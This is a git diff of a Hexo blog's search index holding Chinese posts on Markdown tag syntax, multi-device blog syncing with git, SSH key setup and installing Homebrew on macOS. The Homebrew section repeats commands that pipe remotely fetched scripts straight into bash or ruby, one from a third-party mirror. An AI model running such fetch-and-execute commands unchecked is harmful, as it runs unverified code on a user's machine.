@@ -1,27 +1,133 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>优雅地写博客</title>
+    <url>/%E4%BC%98%E9%9B%85%E7%9A%84%E5%86%99%E5%8D%9A%E5%AE%A2.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="MarkDown语法总结"><a href="#MarkDown语法总结" class="headerlink" title="MarkDown语法总结"></a>MarkDown语法总结</h2><hr>
+<h3 id="初步进阶"><a href="#初步进阶" class="headerlink" title="初步进阶"></a>初步进阶</h3><p>最基本的语法略过，记录一下少见的语法：</p>
+<h4 id="文本居中标签"><a href="#文本居中标签" class="headerlink" title="文本居中标签"></a>文本居中标签</h4><p>作用：引用单行文本，作为文章开篇题词。</p>
+<p>效果：</p>
+<blockquote class="blockquote-center">我不去想是否能够成功，既然选择了远方，便只顾风雨兼程。</blockquote>
+使用：
+<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="comment">&lt;!-- HTML方式: 直接在 Markdown 文件中编写 HTML 来调用 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 其中 class=&quot;blockquote-center&quot; 是必须的 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">blockquote</span> <span class="attr">class</span>=<span class="string">&quot;blockquote-center&quot;</span>&gt;</span>blah blah blah<span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 标签方式 --&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name">centerquote</span> %&#125;</span><span class="xml">blah blah blah</span><span class="template-tag">&#123;% <span class="name">endcenterquote</span> %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 标签别名 --&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name">cq</span> %&#125;</span><span class="xml"> blah blah blah </span><span class="template-tag">&#123;% <span class="name">endcq</span> %&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="代码块进阶用法"><a href="#代码块进阶用法" class="headerlink" title="代码块进阶用法"></a>代码块进阶用法</h4><p>效果：</p>
+<figure class="highlight plain"><figcaption><span>[hello world] [https://baidu.com] [链接地址]</span></figcaption><table><tr><td class="code"><pre><span class="line">console.log(&quot;Hello world!&quot;);</span><br></pre></td></tr></table></figure>
+<p>使用：</p>
+<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">``` [language] [title] [url] [link text]</span><br><span class="line">code snippet</span><br><span class="line">```.</span><br></pre></td></tr></table></figure>
+<p>各参数含义：</p>
+<ul>
+<li>langugae：语言名称，引导渲染引擎正确解析并高亮显示关键字</li>
+<li>title：代码块标题，将会显示在左上角</li>
+<li>url：链接地址，如果没有指定 link text 则会在右上角显示 link</li>
+<li>link text：链接名称，指定 url 后有效，将会显示在右上角</li>
+</ul>
+<p>url 必须为有效链接地址才会以链接的形式显示在右上角，否则将作为标题显示在左上角。以 url 为分界，左侧除了第一个单词会被解析为 language，其他所有单词都会被解析为 title，而右侧的所有单词都会被解析为 link text。</p>
+<p>如果不想填写 title，可以在 language 和 url 之间添加至少三个空格。</p>
+<h4 id="note标签"><a href="#note标签" class="headerlink" title="note标签"></a>note标签</h4><p>作用：通过note标签为段落添加背景颜色<br>使用：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in"> note </span>[class] %&#125;</span><br><span class="line">文本内容 (支持行内标签)</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>class种类包括default primary success info warning danger，也可以不指定 class。</p>
+<h4 id="lebal标签"><a href="#lebal标签" class="headerlink" title="lebal标签"></a>lebal标签</h4><p>作用：通过label标签为文字添加背景色<br>使用：</p>
+<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">&#123;% label [<span class="class"><span class="keyword">class</span>]<span class="meta">@text</span>  %&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>支持的 class 种类包括 default primary success info warning danger，默认使用 default 作为缺省。</p>
+<p>使用示例：</p>
+<figure class="highlight puppet"><table><tr><td class="code"><pre><span class="line">I heard the echo, &#123;% label default@from the valleys and the heart %&#125;</span><br><span class="line">Open to the lonely soul <span class="keyword">of</span> &#123;% label info@sickle harvesting %&#125;</span><br><span class="line"><span class="keyword">Repeat</span> <span class="keyword">outrightly</span>, but also repeat the well-being of</span><br><span class="line"><span class="keyword">Eventually</span> &#123;% label warning@swaying <span class="keyword">in</span> the desert oasis %&#125;</span><br><span class="line">&#123;% label success@I believe %&#125; <span class="keyword">I</span> <span class="keyword">am</span></span><br><span class="line">&#123;% label primary@Born as the bright summer flowers %&#125;</span><br><span class="line"><span class="keyword">Do</span> <span class="keyword">not</span> <span class="keyword">withered</span> <span class="keyword">undefeated</span> <span class="keyword">fiery</span> <span class="keyword">demon</span> <span class="keyword">rule</span></span><br><span class="line"><span class="keyword">Heart</span> <span class="keyword">rate</span> <span class="keyword">and</span> <span class="keyword">breathing</span> <span class="keyword">to</span> <span class="keyword">bear</span> &#123;% label danger@the load of the cumbersome %&#125;</span><br><span class="line"><span class="keyword">Bored</span></span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<p>I heard the echo, <span class="label default">from the valleys and the heart</span><br>Open to the lonely soul of <span class="label info">sickle harvesting</span><br>Repeat outrightly, but also repeat the well-being of<br>Eventually <span class="label warning">swaying in the desert oasis</span></p>
+<span class="label success">I believe</span> I am
+<span class="label primary">Born as the bright summer flowers</span>
+<p>Do not withered undefeated fiery demon rule<br>Heart rate and breathing to bear <span class="label danger">the load of the cumbersome</span><br>Bored</p>
+<h4 id="button按钮"><a href="#button按钮" class="headerlink" title="button按钮"></a>button按钮</h4><p>使用示例：</p>
+<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name">btn</span> #, 文本 %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name">btn</span> #, 文本 &amp; 标题,, 标题 %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name">btn</span> #, 文本 &amp; 图标, home %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name">btn</span> #, 文本 &amp; 大图标 (固定宽度), home fa-fw fa-lg %&#125;</span></span><br></pre></td></tr></table></figure>
+<p>效果:</p>
+<a class="btn" href="#">文本</a>
+<a class="btn" href="#" title="标题">文本 & 标题</a>
+<a class="btn" href="#"><i class="fa fa-home"></i>文本 & 图标</a>
+<a class="btn" href="#"><i class="fa fa-home fa-fw fa-lg"></i>文本 & 大图标 (固定宽度)</a>
+
+<h4 id="引用站内链接"><a href="#引用站内链接" class="headerlink" title="引用站内链接"></a>引用站内链接</h4><p>语法:</p>
+<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name">post_path</span> hexo-writing-skills %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name">post_link</span> hexo-writing-skills 链接标题 %&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<p>我是第一个标签：/titled.html</p>
+<p>我是第二个标签：<a href="/MacOS%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE.html" title="我是链接">我是链接</a></p>
+<p>注意：第一个标签中使用中文会进行urlencode，不太美观。</p>
+<h3 id="插入多媒体"><a href="#插入多媒体" class="headerlink" title="插入多媒体"></a>插入多媒体</h3><h4 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h4><p>直接使用Mweb，之前的方法和MWeb比起来，简直不是一个数量级的。<br>爽就一个字，我只说一次！<br>墙裂建议使用Mac的同学尝试一下。</p>
+<h4 id="插入网易云音乐"><a href="#插入网易云音乐" class="headerlink" title="插入网易云音乐"></a>插入网易云音乐</h4><p>在网页版网易云中找到想要插入的歌曲，点击生成外链播放器：</p>
+<p><img src="https://tuchuang-1258055330.cos.ap-chengdu.myqcloud.com/2020/08/26/15984127556340.jpg"><br>根据自己的需求生成：</p>
+<p><img src="https://tuchuang-1258055330.cos.ap-chengdu.myqcloud.com/2020/08/26/15984128149960.jpg"></p>
+<p>但是，hexo渲染的时候，默认是把播放器的宽度拉满整个页款，有点别扭。所以做以下修改：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var SUPPORTED_PLAYERS &#x3D; [</span><br><span class="line">  &#39;www.youtube.com&#39;,</span><br><span class="line">  &#39;player.vimeo.com&#39;,</span><br><span class="line">  &#39;player.youku.com&#39;,</span><br><span class="line">  &#x2F;&#x2F;&#39;music.163.com&#39;,</span><br><span class="line">  &#39;www.tudou.com&#39;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+<p>播放器变成左对齐固定宽度，居中播放请加一个<code>&lt;center&gt;&lt;/center&gt;</code>标签</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginwidth</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginheight</span>=<span class="string">&quot;0&quot;</span> <span class="attr">width</span>=<span class="string">330</span> <span class="attr">height</span>=<span class="string">86</span> <span class="attr">src</span>=<span class="string">&quot;//music.163.com/outchain/player?type=2&amp;id=27491508&amp;auto=1&amp;height=66&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>效果如下：</p>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=27491508&auto=1&height=66"></iframe>
+
+
+<p>上下有空行，可以尝试把html标签写到一行里面。</p>
+<h2 id="Mac端编辑环境"><a href="#Mac端编辑环境" class="headerlink" title="Mac端编辑环境"></a>Mac端编辑环境</h2><p>利用Mweb和腾讯云对象存储COS实现快速方便的编辑博客<br>对Mweb的设置如下：<br><img src="https://tuchuang-1258055330.cos.ap-chengdu.myqcloud.com/2020/08/26/15984060068608.jpg"></p>
+<ol>
+<li>通过 文件-打开外部模式</li>
+<li>可以在偏好设置中勾选”启动时默认打开外部模式”</li>
+<li>在设置页面配置腾讯云Cos图床</li>
+<li>进入外部模式后, 点击左下角+, 引入文件夹, 把 /hexo/source/ 配置进去</li>
+<li>在 source文件夹下创建images文件夹, 同时将source的保存拖入的图片文件夹名称, 指定为images</li>
+</ol>
+<p><code>这样设置的好处是, 在MWeb编辑时, 把图片往文章拖拽或者粘贴, MWeb都会自动将图片保存在images目录, 发布时也会自动发布, 省心省事</code> </p>
+<h2 id="多设备同步编辑"><a href="#多设备同步编辑" class="headerlink" title="多设备同步编辑"></a>多设备同步编辑</h2><hr>
+<p>因为hexo的架构环境在本地, 在Github上发布的只是public文件夹,<br>所以如果想要在2台以上的电脑上同时来维护同一份博客,<br>就需要构建多设备同步的编辑环境.</p>
+<h3 id="构建思路"><a href="#构建思路" class="headerlink" title="构建思路"></a>构建思路</h3><ol>
+<li>假设在公司和家中分别有A,B两台电脑</li>
+<li>A电脑已经完成了本篇所讲述的hexo环境搭建,并且能把public文件夹网站文件发布到github的库master主分支</li>
+<li>此时只要把A电脑hexo文件夹下网站文件,保存到github的另外一个分支比如branch_name即可</li>
+<li>然后在B电脑将将分支branch_name的内容全部获取下来, 再更新内容时,将重新发布public文件夹并发布到master分支</li>
+<li>核心思路: 网站文件存在master分支, 所有源文件存在branch_name分支</li>
+</ol>
+<h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><h4 id="首先-假设A电脑已经完成了hexo搭建和github连接-进入根目录MyBlog"><a href="#首先-假设A电脑已经完成了hexo搭建和github连接-进入根目录MyBlog" class="headerlink" title="首先, 假设A电脑已经完成了hexo搭建和github连接, 进入根目录MyBlog"></a>首先, 假设A电脑已经完成了hexo搭建和github连接, 进入根目录MyBlog</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd MyBlog                                       </span><br><span class="line">git init <span class="comment">#git初始化                                     </span></span><br><span class="line">git remote add origin https:<span class="regexp">//gi</span>thub.com<span class="regexp">/djangopan/</span>djangopan.github.io.git <span class="comment">#添加仓库地址 </span></span><br><span class="line">git checkout -b hexo <span class="comment">#新建分支branch_name, 名称是hexo, 切换到新分支</span></span><br><span class="line">git add . <span class="comment">#添加所有本地文件到git                        </span></span><br><span class="line">git commit -m <span class="string">&quot;This is for Mac&quot;</span> <span class="comment">#git提交 </span></span><br><span class="line">git push origin hexo <span class="comment">#文件推送到hexo分支              </span></span><br></pre></td></tr></table></figure>
+
+<h4 id="然后-在B电脑部署git环境和node-js环境-在-目录下"><a href="#然后-在B电脑部署git环境和node-js环境-在-目录下" class="headerlink" title="然后, 在B电脑部署git环境和node.js环境, 在~目录下"></a>然后, 在B电脑部署git环境和node.js环境, 在~目录下</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone -b hexo https:<span class="regexp">//gi</span>thub.com<span class="regexp">/djangopan/</span>djangopan.github.io.git MyBlog <span class="comment"># clone分支hexo的内容, 也就是所有源文件</span></span><br></pre></td></tr></table></figure>
+
+<p>此时会在~目录上自动创建一个文件夹 MyBlog</p>
+<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">cd MyBlog</span><br><span class="line">npm <span class="keyword">install</span> -g hexo-cli <span class="comment">#安装hexo,注意这里不需要hexo初始化,否则之前的hexo配置参数会重置</span></span><br><span class="line">npm <span class="keyword">install</span> <span class="comment">#安装依赖库</span></span><br><span class="line">npm <span class="keyword">install</span> hexo-deployer-git <span class="comment">#安装git部署相关配置 </span></span><br></pre></td></tr></table></figure>
+
+<p>此时环境搭建完成。</p>
+<p>之后多方面写作可以直接这样简化：</p>
+<h4 id="在B电脑完成写作之后"><a href="#在B电脑完成写作之后" class="headerlink" title="在B电脑完成写作之后"></a>在B电脑完成写作之后</h4><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">hexo g -d # 重新生成public文件夹,并发布到 master分支</span><br><span class="line">git add . # 开始讲所有源文件的更新发布                      git commit -m <span class="string">&quot;This is for Windows&quot;</span>          git push origin hexo # 更新发布到hexo分支上 </span><br></pre></td></tr></table></figure>
+
+<h4 id="回到A电脑-用以下指令获取branch-name分支的更新"><a href="#回到A电脑-用以下指令获取branch-name分支的更新" class="headerlink" title="回到A电脑, 用以下指令获取branch_name分支的更新"></a>回到A电脑, 用以下指令获取branch_name分支的更新</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git pull https:<span class="regexp">//gi</span>thub.com<span class="regexp">/djangopan/</span>djangopan.github.io hexo <span class="comment"># 注意要&lt;远程&gt; &lt;分支名称&gt; 之间有一个空格 </span></span><br><span class="line">hexo g -d <span class="comment"># 重新生成public文件夹, 并发布到 master分支</span></span><br><span class="line">git add . <span class="comment"># 开始讲所有源文件的更新发布                      </span></span><br><span class="line">git commit -m <span class="string">&quot;This is for Mac&quot;</span>          </span><br><span class="line">git push origin hexo <span class="comment"># 更新发布到hexo分支上 </span></span><br></pre></td></tr></table></figure>
+
+<p>接下来就周而复始了。</p>
+<h3 id="补充-不利用github分支进行博客迁移"><a href="#补充-不利用github分支进行博客迁移" class="headerlink" title="[补充]不利用github分支进行博客迁移"></a>[补充]不利用github分支进行博客迁移</h3><p>迁移的文件有：</p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 博客配置文件./_config.yml</span><br><span class="line"><span class="number">2</span>. 主题配置文件夹.<span class="regexp">/theme/</span></span><br><span class="line"><span class="number">3</span>. 文章及相关内容的文件夹.<span class="regexp">/source/</span></span><br><span class="line"><span class="number">4</span>. 模板文件夹.<span class="regexp">/scaffolds/</span></span><br><span class="line"><span class="number">5</span>. 记录博客所有的插件的文件./<span class="keyword">package</span>.json</span><br></pre></td></tr></table></figure>
+
+<p>在新Mac上配置hexo的基础环境并且重新部署：</p>
+<ol>
+<li>安装git，并生成密钥，保存到github账号中</li>
+<li>下载并安装Node.js（npm会自己跟着装好）</li>
+<li>使用npm安装hexo ，具体指令为npm install -g hexo-cli<br>❗️注意，安装完hexo之后不用hexo init</li>
+<li>npm install</li>
+</ol>
+<h2 id="生成ssh密钥来增加连接安全"><a href="#生成ssh密钥来增加连接安全" class="headerlink" title="生成ssh密钥来增加连接安全"></a>生成ssh密钥来增加连接安全</h2><hr>
+<p>避免每次修改博客同步都需要输入账号密码，建议添加ssh密钥。</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name <span class="string">&quot;username&quot;</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email <span class="string">&quot;email_address&quot;</span></span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;email_address&quot;</span>  #通过这个命令在~/.ssh文件夹下创建公钥私钥文件</span><br><span class="line">cd ~/.ssh</span><br><span class="line">ls # 会看到至少2个文件 id_rsa(私钥文件) id_rsa.pub(公钥文件)</span><br></pre></td></tr></table></figure>
+
+<p>打开 id_rsa.pub 文件, 复制所有内容<br>进入Github - Setting - keys页面, 新建 new SSH Key, 标题随便写, 粘贴复制内容</p>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>总结</tag>
+      </tags>
+  </entry>
+  <entry>
     <title></title>
     <url>/test/%E4%BC%98%E9%9B%85%E7%9A%84%E5%86%99%E5%8D%9A%E5%AE%A2.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h1 id=""><a href="#" class="headerlink" title=""></a></h1><script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
   </entry>
   <entry>
     <title>MacOS开发环境的配置</title>
@@ -29,10 +135,10 @@
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>因为以后要转战MacOS了，虽然之前也用过一年的Ubuntu实体机，但是Windows的环境和MacOS的开发环境相差还是蛮大，所以一切都得从头开始了…<br>按照我的尿性，估计这种配环境的事以后还得干不少次，为了以后方便，这次把中间采的坑记录下来…</p>
 <h3 id="Home-Brew"><a href="#Home-Brew" class="headerlink" title="Home_Brew"></a>Home_Brew</h3><p>安装过程有点烦，安装之后还要考虑换源或者走代理的方式。</p>
 <p>安装过程：</p>
-<figure class="highlight vim"><table><tbody><tr><td class="code"><pre><span class="line">xcode-select --install</span><br><span class="line"></span><br><span class="line">第一种方法：</span><br><span class="line"></span><br><span class="line">首先用的是官方的安装方法，但是总是连接不上，或者下载到一半就断开，因为节点在国外的原因；</span><br><span class="line">http<span class="variable">s:</span>//brew.<span class="keyword">sh</span>/index_zh-<span class="keyword">cn</span>.html</span><br><span class="line"></span><br><span class="line">安装脚本：</span><br><span class="line">/bin/bash -<span class="keyword">c</span> <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实际上如果卡在git clone的某一个部分，可以把终端命令停下来，然后尝试一下：</span><br><span class="line"></span><br><span class="line">git clone gi<span class="variable">t:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/homebrew-core.git/ /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core --depth=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">/bin/bash -<span class="keyword">c</span> <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">下载失败报错之后尝试</span><br><span class="line">第二种办法：</span><br><span class="line"></span><br><span class="line">为了防止出错，先把之前安装到一半的brew卸载了：</span><br><span class="line">/usr/bin/<span class="keyword">ruby</span> -<span class="keyword">e</span> <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl -fsSL http<span class="variable">s:</span>//raw.githubusercontent.<span class="keyword">com</span>/Homebrew/install/master/install.<span class="keyword">sh</span> &gt;&gt; brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">vim</span> brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">将文件中的</span><br><span class="line">BREW_REPO=<span class="string">"https://github.com/Homebrew/brew"</span></span><br><span class="line">改为</span><br><span class="line">BREW_REPO=<span class="string">"https://mirrors.ustc.edu.cn/brew.git"</span></span><br><span class="line">CORE_TAP_REPO=<span class="string">"https://mirrors.ustc.edu.cn/homebrew-core.git"</span></span><br><span class="line"></span><br><span class="line">运行：</span><br><span class="line">/bin/bash brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">如果出现下面这种下载速度慢或者卡住的情况，把终端停掉，使用浏览器打开那个链接进行下载，比如这里是 http<span class="variable">s:</span>//homebrew.bintray.<span class="keyword">com</span>/bottles-portable-<span class="keyword">ruby</span>/portable-<span class="keyword">ruby</span>-<span class="number">2.6</span>.<span class="number">3</span>.mavericks.bottle.tar.gz，下载完成后将该文件放进 /Users/$你的用户名/Library/Caches/Homebrew 中。</span><br><span class="line"></span><br><span class="line">==&gt; Downloading http<span class="variable">s:</span>//homebrew.bintray.<span class="keyword">com</span>/bottles-portable-<span class="keyword">ruby</span>/portable-<span class="keyword">ruby</span>-<span class="number">2.6</span>.<span class="number">3</span>.mavericks.bottle.tar.gz</span><br><span class="line">############### <span class="number">21.6</span>%</span><br><span class="line"></span><br><span class="line">重新运行安装指令。</span><br><span class="line"></span><br><span class="line">/bin/bash brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">如果安装过程中卡在了 Clone 什么的地方不动了，则停掉终端，运行下列指令。</span><br><span class="line"></span><br><span class="line">git clone gi<span class="variable">t:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/homebrew-core.git/ /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core --depth=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">执行完上述指令，再重新运行安装指令。</span><br><span class="line"></span><br><span class="line">/bin/bash brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">安装完成。</span><br><span class="line"></span><br><span class="line">第三种方法：</span><br><span class="line"></span><br><span class="line">利用中科大的源：</span><br><span class="line"></span><br><span class="line">/usr/bin/<span class="keyword">ruby</span> -<span class="keyword">e</span> <span class="string">"$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install)"</span></span><br><span class="line">如果命令执行中卡在下面信息：</span><br><span class="line"></span><br><span class="line">==&gt; Tapping homebrew/core</span><br><span class="line">Cloning into <span class="string">'/usr/local/Homebrew/Library/Taps/homebrew/homebrew-core'</span>...</span><br><span class="line"></span><br><span class="line">请Control + C中断脚本执行如下命令：</span><br><span class="line"></span><br><span class="line"><span class="keyword">cd</span> <span class="string">"$(brew --repo)/Library/Taps/"</span></span><br><span class="line"><span class="built_in">mkdir</span> homebrew &amp;&amp; <span class="keyword">cd</span> homebrew</span><br><span class="line">git clone gi<span class="variable">t:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/homebrew-core.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">打开新的终端：</span><br><span class="line">brew doctor</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">xcode-select --install</span><br><span class="line"></span><br><span class="line">第一种方法：</span><br><span class="line"></span><br><span class="line">首先用的是官方的安装方法，但是总是连接不上，或者下载到一半就断开，因为节点在国外的原因；</span><br><span class="line">http<span class="variable">s:</span>//brew.<span class="keyword">sh</span>/index_zh-<span class="keyword">cn</span>.html</span><br><span class="line"></span><br><span class="line">安装脚本：</span><br><span class="line">/bin/bash -<span class="keyword">c</span> <span class="string">&quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实际上如果卡在git clone的某一个部分，可以把终端命令停下来，然后尝试一下：</span><br><span class="line"></span><br><span class="line">git clone gi<span class="variable">t:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/homebrew-core.git/ /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core --depth=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">/bin/bash -<span class="keyword">c</span> <span class="string">&quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">下载失败报错之后尝试</span><br><span class="line">第二种办法：</span><br><span class="line"></span><br><span class="line">为了防止出错，先把之前安装到一半的brew卸载了：</span><br><span class="line">/usr/bin/<span class="keyword">ruby</span> -<span class="keyword">e</span> <span class="string">&quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl -fsSL http<span class="variable">s:</span>//raw.githubusercontent.<span class="keyword">com</span>/Homebrew/install/master/install.<span class="keyword">sh</span> &gt;&gt; brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">vim</span> brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">将文件中的</span><br><span class="line">BREW_REPO=<span class="string">&quot;https://github.com/Homebrew/brew&quot;</span></span><br><span class="line">改为</span><br><span class="line">BREW_REPO=<span class="string">&quot;https://mirrors.ustc.edu.cn/brew.git&quot;</span></span><br><span class="line">CORE_TAP_REPO=<span class="string">&quot;https://mirrors.ustc.edu.cn/homebrew-core.git&quot;</span></span><br><span class="line"></span><br><span class="line">运行：</span><br><span class="line">/bin/bash brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">如果出现下面这种下载速度慢或者卡住的情况，把终端停掉，使用浏览器打开那个链接进行下载，比如这里是 http<span class="variable">s:</span>//homebrew.bintray.<span class="keyword">com</span>/bottles-portable-<span class="keyword">ruby</span>/portable-<span class="keyword">ruby</span>-<span class="number">2.6</span>.<span class="number">3</span>.mavericks.bottle.tar.gz，下载完成后将该文件放进 /Users/$你的用户名/Library/Caches/Homebrew 中。</span><br><span class="line"></span><br><span class="line">==&gt; Downloading http<span class="variable">s:</span>//homebrew.bintray.<span class="keyword">com</span>/bottles-portable-<span class="keyword">ruby</span>/portable-<span class="keyword">ruby</span>-<span class="number">2.6</span>.<span class="number">3</span>.mavericks.bottle.tar.gz</span><br><span class="line">############### <span class="number">21.6</span>%</span><br><span class="line"></span><br><span class="line">重新运行安装指令。</span><br><span class="line"></span><br><span class="line">/bin/bash brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">如果安装过程中卡在了 Clone 什么的地方不动了，则停掉终端，运行下列指令。</span><br><span class="line"></span><br><span class="line">git clone gi<span class="variable">t:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/homebrew-core.git/ /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core --depth=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">执行完上述指令，再重新运行安装指令。</span><br><span class="line"></span><br><span class="line">/bin/bash brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">安装完成。</span><br><span class="line"></span><br><span class="line">第三种方法：</span><br><span class="line"></span><br><span class="line">利用中科大的源：</span><br><span class="line"></span><br><span class="line">/usr/bin/<span class="keyword">ruby</span> -<span class="keyword">e</span> <span class="string">&quot;$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install)&quot;</span></span><br><span class="line">如果命令执行中卡在下面信息：</span><br><span class="line"></span><br><span class="line">==&gt; Tapping homebrew/core</span><br><span class="line">Cloning into <span class="string">&#x27;/usr/local/Homebrew/Library/Taps/homebrew/homebrew-core&#x27;</span>...</span><br><span class="line"></span><br><span class="line">请Control + C中断脚本执行如下命令：</span><br><span class="line"></span><br><span class="line"><span class="keyword">cd</span> <span class="string">&quot;$(brew 